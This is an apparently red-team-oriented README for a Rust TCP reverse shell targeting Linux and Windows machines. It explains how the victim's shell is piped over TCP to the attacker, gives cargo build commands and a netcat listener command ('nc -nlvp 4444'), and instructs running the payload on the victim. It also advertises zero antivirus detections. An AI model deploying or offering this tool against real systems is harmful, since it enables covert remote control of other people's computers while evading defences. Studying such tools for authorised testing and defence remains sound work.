# RCO: TCP Reverse Shell

[![Custom badge](https://img.shields.io/endpoint?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkmanc%2Fremote_code_oxidation%2Fmaster%2F.custom_shields%2Ftcp_reverse_shell.json)](https://github.com/kmanc/remote_code_oxidation/tree/master/tcp_reverse_shell)

Linux target               |  Windows target
:-------------------------:|:-------------------------:
![](https://user-images.githubusercontent.com/14863147/151044738-72dbec76-73b1-47c5-831a-2e995673b559.gif)  |  ![](https://user-images.githubusercontent.com/14863147/151058869-8e5e9f6e-3f7b-4a98-ab65-2ac5017a4e76.gif)


## How it works

The reverse shells for both Linux and Windows work by establishing a [Transmission Control Protocol (TCP) session](https://www.scottklement.com/rpg/socktut/overview.html) from the victim machine to the attacking machine. Then a Terminal (Linux) or Command Prompt (Windows) process starts with its [standard input](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin)), [standard output](https://en.wikipedia.org/wiki/Standard_streams#Standard_output_(stdout)), and [standard error](https://en.wikipedia.org/wiki/Standard_streams#Standard_error_(stderr)) all assigned to the TCP session. This means that input commands and output results are read from and written to (respectively) the TCP stream.


## Using it

1. [Not shown in GIF] Open [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs) 
and change the IP address and port to match the IP address of your attacking machine and the port you will use for a listener respectively
2. [Not shown in GIF] Compile the executable

    #### For Linux targets
    ```commandline
    cargo build -p tcp_reverse_shell --release
    ```

    #### For Windows targets
    ```commandline
    cargo build --target x86_64-pc-windows-gnu -p tcp_reverse_shell --release
    ```
3. Start a netcat listener on the attacking machine on the same port you configured in step 1
    ```commandline
    nc -nlvp 4444
    ```
4. Execute the payload on the victim machine
5. Return to the listener and enter desired commands for the victim machine to run


## Detection rates

[Linux - 0 / 40](https://kleenscan.com/scan_result/386e7a12b38c22d32ccdef0503b80c3793453a42f3d79b410a0b0045638a8715)

![image](https://user-images.githubusercontent.com/14863147/151648466-26d1d573-1593-460a-9339-8355e35a7db9.png)

[Windows - 0 / 40](https://kleenscan.com/scan_result/4b373afdab36bb832b3748aadb92cba8c63dc8f2fdfd9af8a17d1737b364becc)

![image](https://user-images.githubusercontent.com/14863147/151648477-fa050479-0f14-4dc3-b8e1-eef71c0115e3.png)
